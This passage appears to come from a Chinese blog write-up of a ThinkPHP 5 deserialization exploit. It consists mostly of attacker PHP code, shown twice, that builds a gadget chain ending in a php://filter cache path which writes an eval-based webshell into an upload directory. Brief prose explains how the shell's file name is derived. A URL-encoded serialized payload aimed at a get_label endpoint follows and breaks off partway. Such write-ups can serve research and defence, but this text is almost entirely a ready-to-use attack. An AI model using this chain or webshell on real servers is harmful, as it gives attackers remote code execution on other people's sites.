+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$styles</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$handle</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>styles</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;getAttr&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handle</span> <span class=o>=</span><span class=nv>$handle</span><span class=p>;</span> <span class=c1>//$handle-&gt;think\session\driver\Memcached
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\session\driver</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Memcached</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$handler</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$handle</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handler</span> <span class=o>=</span> <span class=nv>$handle</span><span class=p>;</span> <span class=c1>//$handle-&gt;think\cache\driver\File
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\cache\driver</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>File</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$options</span><span class=o>=</span><span class=k>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$tag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span><span class=o>=</span><span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;expire&#39;</span> <span class=o>=&gt;</span> <span class=mi>3600</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;cache_subdir&#39;</span> <span class=o>=&gt;</span> <span class=k>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;prefix&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;path&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;data_compress&#39;</span> <span class=o>=&gt;</span> <span class=k>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>tag</span> <span class=o>=</span> <span class=s1>&#39;xxx&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$Memcached</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\session\driver\Memcached</span><span class=p>(</span><span class=k>new</span> <span class=nx>\think\cache\driver\File</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$Output</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\console\Output</span><span class=p>(</span><span class=nv>$Memcached</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$model</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\db\Query</span><span class=p>(</span><span class=nv>$Output</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$HasOne</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\model\relation\HasOne</span><span class=p>(</span><span class=nv>$model</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$window</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\process\pipes\Windows</span><span class=p>(</span><span class=k>new</span> <span class=nx>think\model\Pivot</span><span class=p>(</span><span class=nv>$Output</span><span class=p>,</span><span class=nv>$HasOne</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$window</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\process\pipes</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Windows</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$files</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$files</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>files</span> <span class=o>=</span> <span class=p>[</span><span class=nv>$files</span><span class=p>];</span> <span class=c1>//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>abstract</span> <span class=k>class</span> <span class=nc>Model</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$append</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$error</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=nv>$parent</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$modelRelation</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>parent</span> <span class=o>=</span> <span class=nv>$output</span><span class=p>;</span>  <span class=c1>//$this-&gt;parent=&gt; think\console\Output;
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>append</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;xxx&#34;</span><span class=o>=&gt;</span><span class=s2>&#34;getError&#34;</span><span class=p>);</span>     <span class=c1>//调用getError 返回this-&gt;error
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span> <span class=o>=</span> <span class=nv>$modelRelation</span><span class=p>;</span>               <span class=c1>// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>think\Model</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Pivot</span> <span class=k>extends</span> <span class=nx>Model</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$modelRelation</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>parent</span><span class=o>::</span><span class=na>__construct</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$modelRelation</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model\relation</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>HasOne</span> <span class=k>extends</span> <span class=nx>OneToOne</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\model\relation</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>abstract</span> <span class=k>class</span> <span class=nc>OneToOne</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$selfRelation</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$bindAttr</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$query</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>selfRelation</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>query</span> <span class=o>=</span> <span class=nv>$query</span><span class=p>;</span>    <span class=c1>//$query指向Query
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>bindAttr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;xxx&#39;</span><span class=p>];</span><span class=c1>// $value值，作为call函数引用的第二变量
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\db</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Query</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$model</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$model</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>model</span> <span class=o>=</span> <span class=nv>$model</span><span class=p>;</span> <span class=c1>//$this-&gt;model=&gt; think\console\Output;
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\console</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Output</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$handle</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$styles</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$handle</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>styles</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;getAttr&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handle</span> <span class=o>=</span><span class=nv>$handle</span><span class=p>;</span> <span class=c1>//$handle-&gt;think\session\driver\Memcached
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\session\driver</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>Memcached</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$handler</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$handle</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>handler</span> <span class=o>=</span> <span class=nv>$handle</span><span class=p>;</span> <span class=c1>//$handle-&gt;think\cache\driver\File
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>think\cache\driver</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>File</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$options</span><span class=o>=</span><span class=k>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>protected</span> <span class=nv>$tag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span><span class=o>=</span><span class=p>[</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;expire&#39;</span> <span class=o>=&gt;</span> <span class=mi>3600</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;cache_subdir&#39;</span> <span class=o>=&gt;</span> <span class=k>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;prefix&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;path&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../public/uploads/images/a.php&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;data_compress&#39;</span> <span class=o>=&gt;</span> <span class=k>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=p>];</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>tag</span> <span class=o>=</span> <span class=s1>&#39;xxx&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$Memcached</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\session\driver\Memcached</span><span class=p>(</span><span class=k>new</span> <span class=nx>\think\cache\driver\File</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$Output</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\console\Output</span><span class=p>(</span><span class=nv>$Memcached</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$model</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\db\Query</span><span class=p>(</span><span class=nv>$Output</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$HasOne</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\model\relation\HasOne</span><span class=p>(</span><span class=nv>$model</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$window</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>think\process\pipes\Windows</span><span class=p>(</span><span class=k>new</span> <span class=nx>think\model\Pivot</span><span class=p>(</span><span class=nv>$Output</span><span class=p>,</span><span class=nv>$HasOne</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$window</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>文件名的生成规则是：<code>原本的文件名+md5('tag_'+md5($this->tag))+'.php'</code>，这里的话就是<code>'a.php'+md5('tag_'+md5('xxx'))+'.php'</code>，即<code>a.php12ac95f1498ce51d2d96a249c09c1998.php</code></p><p>有个小坑，这里的根目录不可写，所以无法成功写马，所以我们换到<code>/public/uploads/images</code>这个目录下面，或者<code>/runtime/temp</code>这个目录也行，最终payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=n>php</span><span class=o>/</span><span class=n>index</span><span class=o>/</span><span class=n>labelmodels</span><span class=o>/</span><span class=n>get_label</span><span class=err>?</span><span class=n>tag_array</span><span class=p>[</span><span class=n>cfg</span><span class=p>]</span><span class=o>=</span><span class=n>O</span><span class=o>%</span><span class=mi>3</span><span class=n>A27</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Cprocess</span><span class=o>%</span><span class=mi>5</span><span class=n>Cpipes</span><span class=o>%</span><span class=mi>5</span><span class=n>CWindows</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A34</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Cprocess</span><span class=o>%</span><span class=mi>5</span><span class=n>Cpipes</span><span class=o>%</span><span class=mi>5</span><span class=n>CWindows</span><span class=o>%</span><span class=mi>00</span><span class=n>files</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Ba</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bi</span><span class=o>%</span><span class=mi>3</span><span class=n>A0</span><span class=o>%</span><span class=mi>3</span><span class=n>BO</span><span class=o>%</span><span class=mi>3</span><span class=n>A17</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Cmodel</span><span class=o>%</span><span class=mi>5</span><span class=n>CPivot</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A3</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A9</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>append</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Ba</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A3</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>xxx</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A8</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>getError</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>Ds</span><span class=o>%</span><span class=mi>3</span><span class=n>A8</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>error</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>BO</span><span class=o>%</span><span class=mi>3</span><span class=n>A27</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Cmodel</span><span class=o>%</span><span class=mi>5</span><span class=n>Crelation</span><span class=o>%</span><span class=mi>5</span><span class=n>CHasOne</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A3</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A15</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>selfRelation</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Bi</span><span class=o>%</span><span class=mi>3</span><span class=n>A0</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A11</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>bindAttr</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Ba</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bi</span><span class=o>%</span><span class=mi>3</span><span class=n>A0</span><span class=o>%</span><span class=mi>3</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A3</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>xxx</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>B</span><span class=o>%</span><span class=mi>7</span><span class=n>Ds</span><span class=o>%</span><span class=mi>3</span><span class=n>A8</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>query</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>BO</span><span class=o>%</span><span class=mi>3</span><span class=n>A14</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Cdb</span><span class=o>%</span><span class=mi>5</span><span class=n>CQuery</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A8</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>model</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>BO</span><span class=o>%</span><span class=mi>3</span><span class=n>A20</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Cconsole</span><span class=o>%</span><span class=mi>5</span><span class=n>COutput</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A2</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A28</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Cconsole</span><span class=o>%</span><span class=mi>5</span><span class=n>COutput</span><span class=o>%</span><span class=mi>00</span><span class=n>handle</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>BO</span><span class=o>%</span><span class=mi>3</span><span class=n>A30</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Csession</span><span class=o>%</span><span class=mi>5</span><span class=n>Cdriver</span><span class=o>%</span><span class=mi>5</span><span class=n>CMemcached</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A1</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A10</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>handler</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>BO</span><span class=o>%</span><span class=mi>3</span><span class=n>A23</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=n>think</span><span class=o>%</span><span class=mi>5</span><span class=n>Ccache</span><span class=o>%</span><span class=mi>5</span><span class=n>Cdriver</span><span class=o>%</span><span class=mi>5</span><span class=n>CFile</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>A2</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>7</span><span class=n>Bs</span><span class=o>%</span><span class=mi>3</span><span class=n>A10</span><span class=o>%</span><span class=mi>3</span><span class=n>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>00</span><span class=o>%</span><span class=mi>2</span><span class=n>A</span><span class=o>%</span><span class=mi>00</span><span class=n>options</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=n>Ba</span><span class=o>%</span><span class=mi>3</span><span class=n>A5</span><span class=o>%</span><span 